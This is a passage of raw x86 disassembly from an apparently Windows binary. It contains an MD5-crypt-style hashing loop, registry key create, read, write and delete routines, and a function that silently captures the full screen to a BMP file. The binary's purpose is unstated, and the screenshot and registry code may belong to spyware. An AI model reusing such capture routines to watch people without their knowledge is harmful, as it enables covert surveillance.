13146b79:	85 db                	test   %ebx,%ebx
13146b7b:	74 21                	je     0x13146b9e
13146b7d:	f6 c3 01             	test   $0x1,%bl
13146b80:	6a 01                	push   $0x1
13146b82:	74 06                	je     0x13146b8a
13146b84:	8d 45 f0             	lea    -0x10(%ebp),%eax
13146b87:	50                   	push   %eax
13146b88:	eb 01                	jmp    0x13146b8b
13146b8a:	57                   	push   %edi
13146b8b:	8d 85 40 ff ff ff    	lea    -0xc0(%ebp),%eax
13146b91:	50                   	push   %eax
13146b92:	e8 e6 f3 ff ff       	call   0x13145f7d
13146b97:	83 c4 0c             	add    $0xc,%esp
13146b9a:	d1 fb                	sar    %ebx
13146b9c:	75 df                	jne    0x13146b7d
13146b9e:	ff 35 e8 07 15 13    	pushl  0x131507e8
13146ba4:	56                   	push   %esi
13146ba5:	e8 16 bc ff ff       	call   0x131427c0
13146baa:	ff 75 0c             	pushl  0xc(%ebp)
13146bad:	ff 35 4c 3a 15 13    	pushl  0x13153a4c
13146bb3:	56                   	push   %esi
13146bb4:	e8 e5 bb ff ff       	call   0x1314279e
13146bb9:	68 f0 07 15 13       	push   $0x131507f0
13146bbe:	56                   	push   %esi
13146bbf:	e8 ae bb ff ff       	call   0x13142772
13146bc4:	8d 85 40 ff ff ff    	lea    -0xc0(%ebp),%eax
13146bca:	50                   	push   %eax
13146bcb:	8d 45 f0             	lea    -0x10(%ebp),%eax
13146bce:	50                   	push   %eax
13146bcf:	e8 47 f4 ff ff       	call   0x1314601b
13146bd4:	83 c4 24             	add    $0x24,%esp
13146bd7:	33 db                	xor    %ebx,%ebx
13146bd9:	8d 45 98             	lea    -0x68(%ebp),%eax
13146bdc:	50                   	push   %eax
13146bdd:	e8 73 f3 ff ff       	call   0x13145f55
13146be2:	89 5d 08             	mov    %ebx,0x8(%ebp)
13146be5:	59                   	pop    %ecx
13146be6:	83 65 08 01          	andl   $0x1,0x8(%ebp)
13146bea:	74 16                	je     0x13146c02
13146bec:	57                   	push   %edi
13146bed:	e8 0b bb ff ff       	call   0x131426fd
13146bf2:	50                   	push   %eax
13146bf3:	8d 45 98             	lea    -0x68(%ebp),%eax
13146bf6:	57                   	push   %edi
13146bf7:	50                   	push   %eax
13146bf8:	e8 80 f3 ff ff       	call   0x13145f7d
13146bfd:	83 c4 10             	add    $0x10,%esp
13146c00:	eb 12                	jmp    0x13146c14
13146c02:	8d 45 f0             	lea    -0x10(%ebp),%eax
13146c05:	6a 10                	push   $0x10
13146c07:	50                   	push   %eax
13146c08:	8d 45 98             	lea    -0x68(%ebp),%eax
13146c0b:	50                   	push   %eax
13146c0c:	e8 6c f3 ff ff       	call   0x13145f7d
13146c11:	83 c4 0c             	add    $0xc,%esp
13146c14:	8b c3                	mov    %ebx,%eax
13146c16:	6a 03                	push   $0x3
13146c18:	99                   	cltd   
13146c19:	59                   	pop    %ecx
13146c1a:	f7 f9                	idiv   %ecx
13146c1c:	85 d2                	test   %edx,%edx
13146c1e:	74 15                	je     0x13146c35
13146c20:	ff 75 0c             	pushl  0xc(%ebp)
13146c23:	8d 45 98             	lea    -0x68(%ebp),%eax
13146c26:	ff 35 4c 3a 15 13    	pushl  0x13153a4c
13146c2c:	50                   	push   %eax
13146c2d:	e8 4b f3 ff ff       	call   0x13145f7d
13146c32:	83 c4 0c             	add    $0xc,%esp
13146c35:	8b c3                	mov    %ebx,%eax
13146c37:	6a 07                	push   $0x7
13146c39:	99                   	cltd   
13146c3a:	59                   	pop    %ecx
13146c3b:	f7 f9                	idiv   %ecx
13146c3d:	85 d2                	test   %edx,%edx
13146c3f:	74 14                	je     0x13146c55
13146c41:	57                   	push   %edi
13146c42:	e8 b6 ba ff ff       	call   0x131426fd
13146c47:	50                   	push   %eax
13146c48:	8d 45 98             	lea    -0x68(%ebp),%eax
13146c4b:	57                   	push   %edi
13146c4c:	50                   	push   %eax
13146c4d:	e8 2b f3 ff ff       	call   0x13145f7d
13146c52:	83 c4 10             	add    $0x10,%esp
13146c55:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
13146c59:	74 14                	je     0x13146c6f
13146c5b:	8d 45 f0             	lea    -0x10(%ebp),%eax
13146c5e:	6a 10                	push   $0x10
13146c60:	50                   	push   %eax
13146c61:	8d 45 98             	lea    -0x68(%ebp),%eax
13146c64:	50                   	push   %eax
13146c65:	e8 13 f3 ff ff       	call   0x13145f7d
13146c6a:	83 c4 0c             	add    $0xc,%esp
13146c6d:	eb 14                	jmp    0x13146c83
13146c6f:	57                   	push   %edi
13146c70:	e8 88 ba ff ff       	call   0x131426fd
13146c75:	50                   	push   %eax
13146c76:	8d 45 98             	lea    -0x68(%ebp),%eax
13146c79:	57                   	push   %edi
13146c7a:	50                   	push   %eax
13146c7b:	e8 fd f2 ff ff       	call   0x13145f7d
13146c80:	83 c4 10             	add    $0x10,%esp
13146c83:	8d 45 98             	lea    -0x68(%ebp),%eax
13146c86:	50                   	push   %eax
13146c87:	8d 45 f0             	lea    -0x10(%ebp),%eax
13146c8a:	50                   	push   %eax
13146c8b:	e8 8b f3 ff ff       	call   0x1314601b
13146c90:	43                   	inc    %ebx
13146c91:	59                   	pop    %ecx
13146c92:	81 fb e8 03 00 00    	cmp    $0x3e8,%ebx
13146c98:	59                   	pop    %ecx
13146c99:	0f 8c 3a ff ff ff    	jl     0x13146bd9
13146c9f:	56                   	push   %esi
13146ca0:	e8 58 ba ff ff       	call   0x131426fd
13146ca5:	0f b6 55 f6          	movzbl -0xa(%ebp),%edx
13146ca9:	33 c9                	xor    %ecx,%ecx
13146cab:	6a 04                	push   $0x4
13146cad:	8a 6d f0             	mov    -0x10(%ebp),%ch
13146cb0:	5f                   	pop    %edi
13146cb1:	0b ca                	or     %edx,%ecx
13146cb3:	03 c6                	add    %esi,%eax
13146cb5:	0f b6 55 fc          	movzbl -0x4(%ebp),%edx
13146cb9:	c1 e1 08             	shl    $0x8,%ecx
13146cbc:	0b ca                	or     %edx,%ecx
13146cbe:	57                   	push   %edi
13146cbf:	51                   	push   %ecx
13146cc0:	50                   	push   %eax
13146cc1:	a3 cc 39 15 13       	mov    %eax,0x131539cc
13146cc6:	e8 e5 00 00 00       	call   0x13146db0
13146ccb:	0f b6 45 f1          	movzbl -0xf(%ebp),%eax
13146ccf:	0f b6 4d f7          	movzbl -0x9(%ebp),%ecx
13146cd3:	c1 e0 08             	shl    $0x8,%eax
13146cd6:	01 3d cc 39 15 13    	add    %edi,0x131539cc
13146cdc:	0b c1                	or     %ecx,%eax
13146cde:	0f b6 4d fd          	movzbl -0x3(%ebp),%ecx
13146ce2:	c1 e0 08             	shl    $0x8,%eax
13146ce5:	0b c1                	or     %ecx,%eax
13146ce7:	57                   	push   %edi
13146ce8:	50                   	push   %eax
13146ce9:	ff 35 cc 39 15 13    	pushl  0x131539cc
13146cef:	e8 bc 00 00 00       	call   0x13146db0
13146cf4:	0f b6 45 f2          	movzbl -0xe(%ebp),%eax
13146cf8:	0f b6 4d f8          	movzbl -0x8(%ebp),%ecx
13146cfc:	c1 e0 08             	shl    $0x8,%eax
13146cff:	01 3d cc 39 15 13    	add    %edi,0x131539cc
13146d05:	0b c1                	or     %ecx,%eax
13146d07:	0f b6 4d fe          	movzbl -0x2(%ebp),%ecx
13146d0b:	c1 e0 08             	shl    $0x8,%eax
13146d0e:	0b c1                	or     %ecx,%eax
13146d10:	57                   	push   %edi
13146d11:	50                   	push   %eax
13146d12:	ff 35 cc 39 15 13    	pushl  0x131539cc
13146d18:	e8 93 00 00 00       	call   0x13146db0
13146d1d:	0f b6 45 f3          	movzbl -0xd(%ebp),%eax
13146d21:	0f b6 4d f9          	movzbl -0x7(%ebp),%ecx
13146d25:	c1 e0 08             	shl    $0x8,%eax
13146d28:	01 3d cc 39 15 13    	add    %edi,0x131539cc
13146d2e:	0b c1                	or     %ecx,%eax
13146d30:	0f b6 4d ff          	movzbl -0x1(%ebp),%ecx
13146d34:	c1 e0 08             	shl    $0x8,%eax
13146d37:	0b c1                	or     %ecx,%eax
13146d39:	57                   	push   %edi
13146d3a:	50                   	push   %eax
13146d3b:	ff 35 cc 39 15 13    	pushl  0x131539cc
13146d41:	e8 6a 00 00 00       	call   0x13146db0
13146d46:	0f b6 45 f4          	movzbl -0xc(%ebp),%eax
13146d4a:	0f b6 4d fa          	movzbl -0x6(%ebp),%ecx
13146d4e:	c1 e0 08             	shl    $0x8,%eax
13146d51:	01 3d cc 39 15 13    	add    %edi,0x131539cc
13146d57:	0b c1                	or     %ecx,%eax
13146d59:	0f b6 4d f5          	movzbl -0xb(%ebp),%ecx
13146d5d:	c1 e0 08             	shl    $0x8,%eax
13146d60:	0b c1                	or     %ecx,%eax
13146d62:	57                   	push   %edi
13146d63:	50                   	push   %eax
13146d64:	ff 35 cc 39 15 13    	pushl  0x131539cc
13146d6a:	e8 41 00 00 00       	call   0x13146db0
13146d6f:	0f b6 45 fb          	movzbl -0x5(%ebp),%eax
13146d73:	01 3d cc 39 15 13    	add    %edi,0x131539cc
13146d79:	83 c4 40             	add    $0x40,%esp
13146d7c:	6a 02                	push   $0x2
13146d7e:	50                   	push   %eax
13146d7f:	ff 35 cc 39 15 13    	pushl  0x131539cc
13146d85:	e8 26 00 00 00       	call   0x13146db0
13146d8a:	83 05 cc 39 15 13 02 	addl   $0x2,0x131539cc
13146d91:	a1 cc 39 15 13       	mov    0x131539cc,%eax
13146d96:	6a 10                	push   $0x10
13146d98:	6a 00                	push   $0x0
13146d9a:	80 20 00             	andb   $0x0,(%eax)
13146d9d:	8d 45 f0             	lea    -0x10(%ebp),%eax
13146da0:	50                   	push   %eax
13146da1:	e8 7c b8 ff ff       	call   0x13142622
13146da6:	83 c4 18             	add    $0x18,%esp
13146da9:	8b c6                	mov    %esi,%eax
13146dab:	5f                   	pop    %edi
13146dac:	5e                   	pop    %esi
13146dad:	5b                   	pop    %ebx
13146dae:	c9                   	leave  
13146daf:	c3                   	ret    
13146db0:	8b 44 24 0c          	mov    0xc(%esp),%eax
13146db4:	48                   	dec    %eax
13146db5:	78 1f                	js     0x13146dd6
13146db7:	8d 48 01             	lea    0x1(%eax),%ecx
13146dba:	8b 44 24 04          	mov    0x4(%esp),%eax
13146dbe:	8b 54 24 08          	mov    0x8(%esp),%edx
13146dc2:	c1 6c 24 08 06       	shrl   $0x6,0x8(%esp)
13146dc7:	83 e2 3f             	and    $0x3f,%edx
13146dca:	8a 92 a4 07 15 13    	mov    0x131507a4(%edx),%dl
13146dd0:	88 10                	mov    %dl,(%eax)
13146dd2:	40                   	inc    %eax
13146dd3:	49                   	dec    %ecx
13146dd4:	75 e8                	jne    0x13146dbe
13146dd6:	c3                   	ret    
13146dd7:	55                   	push   %ebp
13146dd8:	8b ec                	mov    %esp,%ebp
13146dda:	51                   	push   %ecx
13146ddb:	51                   	push   %ecx
13146ddc:	8b 45 10             	mov    0x10(%ebp),%eax
13146ddf:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
13146de3:	89 45 f8             	mov    %eax,-0x8(%ebp)
13146de6:	c7 45 fc 00 01 00 00 	movl   $0x100,-0x4(%ebp)
13146ded:	75 04                	jne    0x13146df3
13146def:	33 c0                	xor    %eax,%eax
13146df1:	c9                   	leave  
13146df2:	c3                   	ret    
13146df3:	83 3d 90 a5 17 13 00 	cmpl   $0x0,0x1317a590
13146dfa:	b8 b8 23 15 13       	mov    $0x131523b8,%eax
13146dff:	75 05                	jne    0x13146e06
13146e01:	b8 5c 23 15 13       	mov    $0x1315235c,%eax
13146e06:	8d 4d 10             	lea    0x10(%ebp),%ecx
13146e09:	51                   	push   %ecx
13146e0a:	68 3f 00 0f 00       	push   $0xf003f
13146e0f:	6a 00                	push   $0x0
13146e11:	50                   	push   %eax
13146e12:	ff 35 2c d1 14 13    	pushl  0x1314d12c
13146e18:	ff 15 ac 33 15 13    	call   *0x131533ac
13146e1e:	85 c0                	test   %eax,%eax
13146e20:	74 04                	je     0x13146e26
13146e22:	6a 02                	push   $0x2
13146e24:	eb 2c                	jmp    0x13146e52
13146e26:	8d 45 fc             	lea    -0x4(%ebp),%eax
13146e29:	50                   	push   %eax
13146e2a:	8d 45 f8             	lea    -0x8(%ebp),%eax
13146e2d:	ff 75 0c             	pushl  0xc(%ebp)
13146e30:	50                   	push   %eax
13146e31:	6a 00                	push   $0x0
13146e33:	ff 75 08             	pushl  0x8(%ebp)
13146e36:	ff 75 10             	pushl  0x10(%ebp)
13146e39:	ff 15 b0 33 15 13    	call   *0x131533b0
13146e3f:	85 c0                	test   %eax,%eax
13146e41:	74 04                	je     0x13146e47
13146e43:	6a 03                	push   $0x3
13146e45:	eb 0b                	jmp    0x13146e52
13146e47:	ff 75 10             	pushl  0x10(%ebp)
13146e4a:	ff 15 cc 36 15 13    	call   *0x131536cc
13146e50:	6a 01                	push   $0x1
13146e52:	58                   	pop    %eax
13146e53:	c9                   	leave  
13146e54:	c3                   	ret    
13146e55:	55                   	push   %ebp
13146e56:	8b ec                	mov    %esp,%ebp
13146e58:	51                   	push   %ecx
13146e59:	51                   	push   %ecx
13146e5a:	83 7d 10 01          	cmpl   $0x1,0x10(%ebp)
13146e5e:	75 0e                	jne    0x13146e6e
13146e60:	ff 75 0c             	pushl  0xc(%ebp)
13146e63:	e8 95 b8 ff ff       	call   0x131426fd
13146e68:	59                   	pop    %ecx
13146e69:	89 45 fc             	mov    %eax,-0x4(%ebp)
13146e6c:	eb 15                	jmp    0x13146e83
13146e6e:	6a 04                	push   $0x4
13146e70:	58                   	pop    %eax
13146e71:	39 45 10             	cmp    %eax,0x10(%ebp)
13146e74:	74 f3                	je     0x13146e69
13146e76:	83 7d 10 03          	cmpl   $0x3,0x10(%ebp)
13146e7a:	75 07                	jne    0x13146e83
13146e7c:	c7 45 fc 40 00 00 00 	movl   $0x40,-0x4(%ebp)
13146e83:	83 3d 90 a5 17 13 00 	cmpl   $0x0,0x1317a590
13146e8a:	56                   	push   %esi
13146e8b:	57                   	push   %edi
13146e8c:	bf b8 23 15 13       	mov    $0x131523b8,%edi
13146e91:	be 5c 23 15 13       	mov    $0x1315235c,%esi
13146e96:	8b c7                	mov    %edi,%eax
13146e98:	75 02                	jne    0x13146e9c
13146e9a:	8b c6                	mov    %esi,%eax
13146e9c:	8d 4d f8             	lea    -0x8(%ebp),%ecx
13146e9f:	51                   	push   %ecx
13146ea0:	68 3f 00 0f 00       	push   $0xf003f
13146ea5:	6a 00                	push   $0x0
13146ea7:	50                   	push   %eax
13146ea8:	ff 35 2c d1 14 13    	pushl  0x1314d12c
13146eae:	ff 15 ac 33 15 13    	call   *0x131533ac
13146eb4:	85 c0                	test   %eax,%eax
13146eb6:	74 24                	je     0x13146edc
13146eb8:	83 3d 90 a5 17 13 00 	cmpl   $0x0,0x1317a590
13146ebf:	74 02                	je     0x13146ec3
13146ec1:	8b f7                	mov    %edi,%esi
13146ec3:	8d 45 f8             	lea    -0x8(%ebp),%eax
13146ec6:	50                   	push   %eax
13146ec7:	56                   	push   %esi
13146ec8:	ff 35 2c d1 14 13    	pushl  0x1314d12c
13146ece:	ff 15 04 34 15 13    	call   *0x13153404
13146ed4:	85 c0                	test   %eax,%eax
13146ed6:	75 04                	jne    0x13146edc
13146ed8:	6a 02                	push   $0x2
13146eda:	eb 2a                	jmp    0x13146f06
13146edc:	ff 75 fc             	pushl  -0x4(%ebp)
13146edf:	ff 75 0c             	pushl  0xc(%ebp)
13146ee2:	ff 75 10             	pushl  0x10(%ebp)
13146ee5:	6a 00                	push   $0x0
13146ee7:	ff 75 08             	pushl  0x8(%ebp)
13146eea:	ff 75 f8             	pushl  -0x8(%ebp)
13146eed:	ff 15 44 35 15 13    	call   *0x13153544
13146ef3:	85 c0                	test   %eax,%eax
13146ef5:	74 04                	je     0x13146efb
13146ef7:	33 c0                	xor    %eax,%eax
13146ef9:	eb 0c                	jmp    0x13146f07
13146efb:	ff 75 f8             	pushl  -0x8(%ebp)
13146efe:	ff 15 cc 36 15 13    	call   *0x131536cc
13146f04:	6a 01                	push   $0x1
13146f06:	58                   	pop    %eax
13146f07:	5f                   	pop    %edi
13146f08:	5e                   	pop    %esi
13146f09:	c9                   	leave  
13146f0a:	c3                   	ret    
13146f0b:	83 3d 1c 24 15 13 00 	cmpl   $0x0,0x1315241c
13146f12:	75 03                	jne    0x13146f17
13146f14:	33 c0                	xor    %eax,%eax
13146f16:	c3                   	ret    
13146f17:	ff 74 24 0c          	pushl  0xc(%esp)
13146f1b:	ff 74 24 0c          	pushl  0xc(%esp)
13146f1f:	ff 74 24 0c          	pushl  0xc(%esp)
13146f23:	e8 2d ff ff ff       	call   0x13146e55
13146f28:	83 c4 0c             	add    $0xc,%esp
13146f2b:	c3                   	ret    
13146f2c:	83 3d 1c 24 15 13 00 	cmpl   $0x0,0x1315241c
13146f33:	75 04                	jne    0x13146f39
13146f35:	6a 03                	push   $0x3
13146f37:	58                   	pop    %eax
13146f38:	c3                   	ret    
13146f39:	ff 74 24 0c          	pushl  0xc(%esp)
13146f3d:	ff 74 24 0c          	pushl  0xc(%esp)
13146f41:	ff 74 24 0c          	pushl  0xc(%esp)
13146f45:	e8 8d fe ff ff       	call   0x13146dd7
13146f4a:	83 c4 0c             	add    $0xc,%esp
13146f4d:	c3                   	ret    
13146f4e:	83 3d 90 a5 17 13 00 	cmpl   $0x0,0x1317a590
13146f55:	b8 b8 23 15 13       	mov    $0x131523b8,%eax
13146f5a:	75 05                	jne    0x13146f61
13146f5c:	b8 5c 23 15 13       	mov    $0x1315235c,%eax
13146f61:	50                   	push   %eax
13146f62:	ff 35 2c d1 14 13    	pushl  0x1314d12c
13146f68:	ff 15 c0 33 15 13    	call   *0x131533c0
13146f6e:	f7 d8                	neg    %eax
13146f70:	1b c0                	sbb    %eax,%eax
13146f72:	40                   	inc    %eax
13146f73:	c3                   	ret    
13146f74:	55                   	push   %ebp
13146f75:	8b ec                	mov    %esp,%ebp
13146f77:	81 ec 84 04 00 00    	sub    $0x484,%esp
13146f7d:	53                   	push   %ebx
13146f7e:	56                   	push   %esi
13146f7f:	33 f6                	xor    %esi,%esi
13146f81:	57                   	push   %edi
13146f82:	56                   	push   %esi
13146f83:	56                   	push   %esi
13146f84:	56                   	push   %esi
13146f85:	68 f4 07 15 13       	push   $0x131507f4
13146f8a:	ff 15 80 37 15 13    	call   *0x13153780
13146f90:	8b f8                	mov    %eax,%edi
13146f92:	3b fe                	cmp    %esi,%edi
13146f94:	89 7d e4             	mov    %edi,-0x1c(%ebp)
13146f97:	0f 84 2c 02 00 00    	je     0x131471c9
13146f9d:	6a 08                	push   $0x8
13146f9f:	57                   	push   %edi
13146fa0:	ff 15 78 37 15 13    	call   *0x13153778
13146fa6:	6a 0a                	push   $0xa
13146fa8:	57                   	push   %edi
13146fa9:	89 45 f8             	mov    %eax,-0x8(%ebp)
13146fac:	ff 15 78 37 15 13    	call   *0x13153778
13146fb2:	6a 0c                	push   $0xc
13146fb4:	57                   	push   %edi
13146fb5:	89 45 f4             	mov    %eax,-0xc(%ebp)
13146fb8:	ff 15 78 37 15 13    	call   *0x13153778
13146fbe:	83 f8 08             	cmp    $0x8,%eax
13146fc1:	89 45 f0             	mov    %eax,-0x10(%ebp)
13146fc4:	77 10                	ja     0x13146fd6
13146fc6:	6a 18                	push   $0x18
13146fc8:	57                   	push   %edi
13146fc9:	ff 15 78 37 15 13    	call   *0x13153778
13146fcf:	bb 00 01 00 00       	mov    $0x100,%ebx
13146fd4:	eb 02                	jmp    0x13146fd8
13146fd6:	33 db                	xor    %ebx,%ebx
13146fd8:	57                   	push   %edi
13146fd9:	ff 15 c4 36 15 13    	call   *0x131536c4
13146fdf:	3b c6                	cmp    %esi,%eax
13146fe1:	89 45 fc             	mov    %eax,-0x4(%ebp)
13146fe4:	75 06                	jne    0x13146fec
13146fe6:	57                   	push   %edi
13146fe7:	e9 d7 01 00 00       	jmp    0x131471c3
13146fec:	8b 45 f8             	mov    -0x8(%ebp),%eax
13146fef:	56                   	push   %esi
13146ff0:	89 45 80             	mov    %eax,-0x80(%ebp)
13146ff3:	8b 45 f4             	mov    -0xc(%ebp),%eax
13146ff6:	89 45 84             	mov    %eax,-0x7c(%ebp)
13146ff9:	66 8b 45 f0          	mov    -0x10(%ebp),%ax
13146ffd:	66 89 45 8a          	mov    %ax,-0x76(%ebp)
13147001:	8d 45 e0             	lea    -0x20(%ebp),%eax
13147004:	56                   	push   %esi
13147005:	50                   	push   %eax
13147006:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
1314700c:	6a 01                	push   $0x1
1314700e:	50                   	push   %eax
1314700f:	57                   	push   %edi
13147010:	c7 85 7c ff ff ff 28 	movl   $0x28,-0x84(%ebp)
13147017:	00 00 00 
1314701a:	66 c7 45 88 01 00    	movw   $0x1,-0x78(%ebp)
13147020:	89 75 8c             	mov    %esi,-0x74(%ebp)
13147023:	89 75 90             	mov    %esi,-0x70(%ebp)
13147026:	89 75 94             	mov    %esi,-0x6c(%ebp)
13147029:	89 75 98             	mov    %esi,-0x68(%ebp)
1314702c:	89 5d 9c             	mov    %ebx,-0x64(%ebp)
1314702f:	89 5d a0             	mov    %ebx,-0x60(%ebp)
13147032:	ff 15 58 37 15 13    	call   *0x13153758
13147038:	3b c6                	cmp    %esi,%eax
1314703a:	89 45 e8             	mov    %eax,-0x18(%ebp)
1314703d:	0f 84 76 01 00 00    	je     0x131471b9
13147043:	50                   	push   %eax
13147044:	ff 75 fc             	pushl  -0x4(%ebp)
13147047:	ff 15 54 37 15 13    	call   *0x13153754
1314704d:	3b c6                	cmp    %esi,%eax
1314704f:	0f 84 64 01 00 00    	je     0x131471b9
13147055:	83 f8 ff             	cmp    $0xffffffff,%eax
13147058:	0f 84 5b 01 00 00    	je     0x131471b9
1314705e:	68 20 00 cc 00       	push   $0xcc0020
13147063:	56                   	push   %esi
13147064:	56                   	push   %esi
13147065:	57                   	push   %edi
13147066:	ff 75 f4             	pushl  -0xc(%ebp)
13147069:	ff 75 f8             	pushl  -0x8(%ebp)
1314706c:	56                   	push   %esi
1314706d:	56                   	push   %esi
1314706e:	ff 75 fc             	pushl  -0x4(%ebp)
13147071:	ff 15 60 35 15 13    	call   *0x13153560
13147077:	85 c0                	test   %eax,%eax
13147079:	0f 84 3a 01 00 00    	je     0x131471b9
1314707f:	3b de                	cmp    %esi,%ebx
13147081:	74 14                	je     0x13147097
13147083:	8d 85 7c fb ff ff    	lea    -0x484(%ebp),%eax
13147089:	50                   	push   %eax
1314708a:	53                   	push   %ebx
1314708b:	56                   	push   %esi
1314708c:	ff 75 fc             	pushl  -0x4(%ebp)
1314708f:	ff 15 bc 36 15 13    	call   *0x131536bc
13147095:	8b d8                	mov    %eax,%ebx
13147097:	8b 7d f0             	mov    -0x10(%ebp),%edi
1314709a:	8b 4d f8             	mov    -0x8(%ebp),%ecx
1314709d:	0f af 7d f4          	imul   -0xc(%ebp),%edi
131470a1:	0f af f9             	imul   %ecx,%edi
131470a4:	8b c3                	mov    %ebx,%eax
131470a6:	56                   	push   %esi
131470a7:	c1 ef 03             	shr    $0x3,%edi
131470aa:	c1 e0 02             	shl    $0x2,%eax
131470ad:	89 45 f8             	mov    %eax,-0x8(%ebp)
131470b0:	68 80 00 00 00       	push   $0x80
131470b5:	8d 54 38 36          	lea    0x36(%eax,%edi,1),%edx
131470b9:	83 c0 36             	add    $0x36,%eax
131470bc:	6a 02                	push   $0x2
131470be:	89 45 da             	mov    %eax,-0x26(%ebp)
131470c1:	8b 45 f4             	mov    -0xc(%ebp),%eax
131470c4:	56                   	push   %esi
131470c5:	56                   	push   %esi
131470c6:	68 00 00 00 40       	push   $0x40000000
131470cb:	ff 75 08             	pushl  0x8(%ebp)
131470ce:	89 45 b0             	mov    %eax,-0x50(%ebp)
131470d1:	66 8b 45 f0          	mov    -0x10(%ebp),%ax
131470d5:	66 c7 45 d0 42 4d    	movw   $0x4d42,-0x30(%ebp)
131470db:	89 55 d2             	mov    %edx,-0x2e(%ebp)
131470de:	66 89 75 d6          	mov    %si,-0x2a(%ebp)
131470e2:	66 89 75 d8          	mov    %si,-0x28(%ebp)
131470e6:	c7 45 a8 28 00 00 00 	movl   $0x28,-0x58(%ebp)
131470ed:	89 4d ac             	mov    %ecx,-0x54(%ebp)
131470f0:	66 c7 45 b4 01 00    	movw   $0x1,-0x4c(%ebp)
131470f6:	66 89 45 b6          	mov    %ax,-0x4a(%ebp)
131470fa:	89 75 b8             	mov    %esi,-0x48(%ebp)
131470fd:	89 75 bc             	mov    %esi,-0x44(%ebp)
13147100:	89 75 c0             	mov    %esi,-0x40(%ebp)
13147103:	89 75 c4             	mov    %esi,-0x3c(%ebp)
13147106:	89 5d c8             	mov    %ebx,-0x38(%ebp)
13147109:	89 75 cc             	mov    %esi,-0x34(%ebp)
1314710c:	ff 15 e0 33 15 13    	call   *0x131533e0
13147112:	83 f8 ff             	cmp    $0xffffffff,%eax
13147115:	89 45 08             	mov    %eax,0x8(%ebp)
13147118:	75 1a                	jne    0x13147134
1314711a:	ff 75 e8             	pushl  -0x18(%ebp)
1314711d:	ff 15 e4 33 15 13    	call   *0x131533e4
13147123:	ff 75 fc             	pushl  -0x4(%ebp)
13147126:	ff 15 24 34 15 13    	call   *0x13153424
1314712c:	ff 75 e4             	pushl  -0x1c(%ebp)
1314712f:	e9 8f 00 00 00       	jmp    0x131471c3
13147134:	8d 4d ec             	lea    -0x14(%ebp),%ecx
13147137:	56                   	push   %esi
13147138:	51                   	push   %ecx
13147139:	8d 4d d0             	lea    -0x30(%ebp),%ecx
1314713c:	6a 0e                	push   $0xe
1314713e:	51                   	push   %ecx
1314713f:	50                   	push   %eax
13147140:	ff 15 b4 33 15 13    	call   *0x131533b4
13147146:	8d 45 ec             	lea    -0x14(%ebp),%eax
13147149:	56                   	push   %esi
1314714a:	50                   	push   %eax
1314714b:	8d 45 a8             	lea    -0x58(%ebp),%eax
1314714e:	6a 28                	push   $0x28
13147150:	50                   	push   %eax
13147151:	ff 75 08             	pushl  0x8(%ebp)
13147154:	ff 15 b4 33 15 13    	call   *0x131533b4
1314715a:	3b de                	cmp    %esi,%ebx
1314715c:	74 18                	je     0x13147176
1314715e:	8d 45 ec             	lea    -0x14(%ebp),%eax
13147161:	56                   	push   %esi
13147162:	50                   	push   %eax
13147163:	8d 85 7c fb ff ff    	lea    -0x484(%ebp),%eax
13147169:	ff 75 f8             	pushl  -0x8(%ebp)
1314716c:	50                   	push   %eax
1314716d:	ff 75 08             	pushl  0x8(%ebp)
13147170:	ff 15 b4 33 15 13    	call   *0x131533b4
13147176:	8d 45 ec             	lea    -0x14(%ebp),%eax
13147179:	56                   	push   %esi
1314717a:	50                   	push   %eax
1314717b:	57                   	push   %edi
1314717c:	ff 75 e0             	pushl  -0x20(%ebp)
1314717f:	ff 75 08             	pushl  0x8(%ebp)
13147182:	ff 15 b4 33 15 13    	call   *0x131533b4
13147188:	ff 75 08             	pushl  0x8(%ebp)
1314718b:	ff 15 80 33 15 13    	call   *0x13153380
13147191:	ff 75 e8             	pushl  -0x18(%ebp)
13147194:	ff 15 e4 33 15 13    	call   *0x131533e4
1314719a:	ff 75 fc             	pushl  -0x4(%ebp)
1314719d:	ff 15 24 34 15 13    	call   *0x13153424
131471a3:	ff 75 e4             	pushl  -0x1c(%ebp)
131471a6:	ff 15 24 34 15 13    	call   *0x13153424
131471ac:	6a 64                	push   $0x64
131471ae:	ff 15 fc 36 15 13    	call   *0x131536fc
131471b4:	6a 01                	push   $0x1
131471b6:	58                   	pop    %eax
131471b7:	eb 12                	jmp    0x131471cb
131471b9:	57                   	push   %edi
131471ba:	ff 15 24 34 15 13    	call   *0x13153424
131471c0:	ff 75 fc             	pushl  -0x4(%ebp)
131471c3:	ff 15 24 34 15 13    	call   *0x13153424
131471c9:	33 c0                	xor    %eax,%eax
131471cb:	5f                   	pop    %edi
131471cc:	5e                   	pop    %esi
131471cd:	5b                   	pop    %ebx
131471ce:	c9                   	leave  
131471cf:	c3                   	ret    
131471d0:	55                   	push   %ebp
131471d1:	8b ec                	mov    %esp,%ebp
131471d3:	81 ec 94 0b 00 00    	sub    $0xb94,%esp
131471d9:	83 4d f4 ff          	orl    $0xffffffff,-0xc(%ebp)
131471dd:	53                   	push   %ebx
131471de:	56                   	push   %esi
131471df:	57                   	push   %edi
131471e0:	8d 85 6c f5 ff ff    	lea    -0xa94(%ebp),%eax
131471e6:	68 d0 3a 15 13       	push   $0x13153ad0
131471eb:	50                   	push   %eax
131471ec:	ff 15 98 39 15 13    	call   *0x13153998
131471f2:	59                   	pop    %ecx
131471f3:	33 f6                	xor    %esi,%esi
131471f5:	59                   	pop    %ecx
131471f6:	bf d0 3b 15 13       	mov    $0x13153bd0,%edi
131471fb:	56                   	push   %esi
131471fc:	56                   	push   %esi
131471fd:	6a 03                	push   $0x3
131471ff:	56                   	push   %esi
13147200:	56                   	push   %esi
13147201:	68 00 00 00 80       	push   $0x80000000
13147206:	57                   	push   %edi
13147207:	ff 15 e0 33 15 13    	call   *0x131533e0
1314720d:	83 f8 ff             	cmp    $0xffffffff,%eax
13147210:	89 45 fc             	mov    %eax,-0x4(%ebp)
13147213:	75 55                	jne    0x1314726a
13147215:	57                   	push   %edi
13147216:	8d 85 6c f6 ff ff    	lea    -0x994(%ebp),%eax
1314721c:	68 10 0a 15 13       	push   $0x13150a10
13147221:	50                   	push   %eax
13147222:	ff 15 98 39 15 13    	call   *0x13153998
13147228:	83 c4 0c             	add    $0xc,%esp
1314722b:	80 3d dc 3d 15 13 00 	cmpb   $0x0,0x13153ddc
13147232:	75 26                	jne    0x1314725a
13147234:	ff 35 d4 3d 15 13    	pushl  0x13153dd4
